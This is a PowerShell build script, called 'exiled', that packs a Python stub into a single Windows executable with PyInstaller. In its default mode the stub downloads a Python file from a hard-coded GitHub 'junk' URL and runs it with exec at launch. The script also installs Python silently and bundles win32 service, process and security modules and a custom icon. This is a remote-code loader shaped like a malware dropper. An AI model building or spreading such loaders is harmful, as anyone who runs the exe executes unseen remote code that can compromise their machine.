[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.py",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.png",
    [switch]$Local,
    [switch]$NoIcon,
    [switch]$KeepBuild,
    [switch]$NoDeps
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

$AppName = "exiled"
$OutName = $Out
$WorkDir = Join-Path $PWD "_build"
$DistDir = Join-Path $PWD "dist"
$StubPy  = Join-Path $WorkDir "payload.py"
$IconRaw = Join-Path $WorkDir "icon.raw"
$IconIco = Join-Path $WorkDir "icon.ico"
$ExePath = Join-Path $DistDir "$OutName.exe"
$IconDst = Join-Path $DistDir "icon.ico"

function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
function Get-Arch { if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" } }

function Test-Python {
    param([string]$Exe)
    if (-not $Exe -or -not (Test-Path -LiteralPath $Exe)) { return $false }
    & $Exe -c "import sys" 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Find-Python {
    $c = @()
    foreach ($n in @("python","py","python3")) {
        $cmd = Get-Command $n -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source) { $c += $cmd.Source }
    }
    foreach ($r in @(
        "$env:LocalAppData\Programs\Python\Python*",
        "$env:ProgramFiles\Python*",
        "${env:ProgramFiles(x86)}\Python*"
    )) {
        Get-ChildItem -Path $r -Filter "python.exe" -ErrorAction SilentlyContinue |
            ForEach-Object { $c += $_.FullName }
    }
    foreach ($x in ($c | Select-Object -Unique)) {
        if (Test-Python -Exe $x) { return $x }
    }
    return $null
}

function Install-Python {
    Log "python not found - attempting winget install" "Yellow"
    $wg = Get-Command winget -ErrorAction SilentlyContinue
    if (-not $wg) { return $false }
    & winget install --id Python.Python.3.12 --scope user --silent `
        --accept-package-agreements --accept-source-agreements 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Install-Packages {
    param([string]$Exe, [string[]]$Pkgs)
    Log "installing deps: $($Pkgs -join ', ')"
    & $Exe -m pip install --quiet --disable-pip-version-check --upgrade pip
    & $Exe -m pip install --quiet --disable-pip-version-check @Pkgs
    if ($LASTEXITCODE -ne 0) { Fail "pip install failed" }
}

function Fetch-File {
    param([string]$Url, [string]$Dest)
    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
    if ($curl) {
        & curl.exe -fsSL -A "Mozilla/5.0" $Url -o $Dest
    } else {
        Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
    }
    if (-not (Test-Path -LiteralPath $Dest)) { Fail "fetch failed: $Url" }
}

function Pause-Brief { param([int]$Ms = 90); Start-Sleep -Milliseconds $Ms }

Write-Host ""
Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
Write-Host "  |   exiled  .  build  .  $(Get-Arch)         |" -ForegroundColor DarkCyan
Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
Write-Host ""

Log "python  ->  locating..."
$PythonExe = Find-Python
if (-not $PythonExe) {
    Install-Python | Out-Null
    $PythonExe = Find-Python
}
if (-not $PythonExe) { Fail "python not found." }
& $PythonExe -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter." }
Log "python  ->  $PythonExe" "Green"
Pause-Brief

if (-not $NoDeps) {
    Install-Packages -Exe $PythonExe -Pkgs @("pyinstaller","pillow","pywin32","psutil","requests")
    Log "deps    ->  ready" "Green"
    Pause-Brief
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$useIco = $false
if (-not $NoIcon -and $Icon) {
    try {
        if ($Icon -match '^https?://') {
            Log "icon    ->  fetching"
            Fetch-File -Url $Icon -Dest $IconRaw
        } else {
            if (-not (Test-Path -LiteralPath $Icon)) { Fail "icon missing: $Icon" }
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
        Log "icon    ->  converting to .ico"
        $conv = @"
from PIL import Image
img = Image.open(r'$IconRaw')
if img.mode != 'RGBA': img = img.convert('RGBA')
img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
        $convPy = Join-Path $WorkDir "_icon.py"
        Set-Content -Path $convPy -Value $conv -Encoding UTF8
        & $PythonExe $convPy
        if ($LASTEXITCODE -eq 0) {
            $useIco = $true
            Log "icon    ->  ready" "Green"
        } else {
            Log "icon    ->  conversion failed" "Yellow"
        }
    } catch {
        Log "icon    ->  $($_.Exception.Message)" "Yellow"
    }
}
Pause-Brief

$taskbarBootstrap = @'
import os, sys, ctypes
from ctypes import wintypes

def _exiled_taskbar():
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
            "Exiled.External.App.1")
    except Exception:
        pass
    try:
        ico = None
        if getattr(sys, "frozen", False):
            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
            for c in (os.path.join(base, "icon.ico"),
                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
                if os.path.exists(c):
                    ico = c; break
        else:
            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
            if os.path.exists(c): ico = c
        if not ico: return
        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
        class WC(ctypes.Structure):
            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
        wc = WC()
        wc.cbSize = ctypes.sizeof(WC)
        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        wc.hIcon = hb; wc.hIconSm = hs
        wc.lpszClassName = "ExiledExternalWindow"
        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
    except Exception:
        pass

_exiled_taskbar()
'@

if ($Local) {
    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
    Log "payload ->  injecting taskbar bootstrap (local)"
    $origBody = Get-Content -LiteralPath $Url -Raw
    $body = $taskbarBootstrap + "`r`n" + $origBody
    Set-Content -Path $StubPy -Value $body -Encoding UTF8
} else {
    Log "payload ->  injecting taskbar bootstrap (remote)"
    $remoteSuffix = @"

import tkinter
import tkinter.ttk
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import tkinter.scrolledtext
import tkinter.font
import tkinter.colorchooser

exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
"@
    $body = $taskbarBootstrap + "`r`nimport urllib.request`r`n" + $remoteSuffix
    Set-Content -Path $StubPy -Value $body -Encoding UTF8
}
Log "payload ->  written" "Green"
Pause-Brief

Log "freeze  ->  $OutName.exe"
$pyi = @(
    "-m","PyInstaller",
    "--onefile","--noconfirm","--clean",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $WorkDir "pyi"),
    "--specpath", $WorkDir,
    "--collect-all","tkinter",
    "--collect-all","PIL",
    "--collect-submodules","win32com",
    "--hidden-import","win32api",
    "--hidden-import","win32con",
    "--hidden-import","win32file",
    "--hidden-import","win32process",
    "--hidden-import","win32security",
    "--hidden-import","win32event",
    "--hidden-import","win32service",
    "--hidden-import","win32serviceutil",
    "--hidden-import","win32timezone",
    "--hidden-import","pythoncom",
    "--hidden-import","pywintypes",
    "--hidden-import","psutil",
    "--hidden-import","requests"
)
if ($useIco) {
    $pyi += @("--icon", $IconIco)
    $pyi += @("--add-data", "$IconIco;.")
}
$pyi += $StubPy

& $PythonExe @pyi
if ($LASTEXITCODE -ne 0) { Fail "pyinstaller failed" }

if ($useIco -and (Test-Path $IconIco)) {
    Copy-Item -LiteralPath $IconIco -Destination $IconDst -Force
    Log "icon.ico -> copied next to exe" "Green"
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
}

if (Test-Path -LiteralPath $ExePath) {
    $sz = [math]::Round((Get-Item $ExePath).Length / 1MB, 2)
    Write-Host ""
    Write-Host "  +----------------------------------------+" -ForegroundColor Green
    Write-Host "  |   done   $OutName.exe  .  $sz MB       |" -ForegroundColor Green
    Write-Host "  +----------------------------------------+" -ForegroundColor Green
    Write-Host ""
    Write-Host "  path: $ExePath" -ForegroundColor DarkGray
    if ($useIco -and (Test-Path $IconDst)) {
        Write-Host "  icon: $IconDst" -ForegroundColor DarkGray
    }
    Write-Host ""
} else {
    Fail "exe not produced"
}
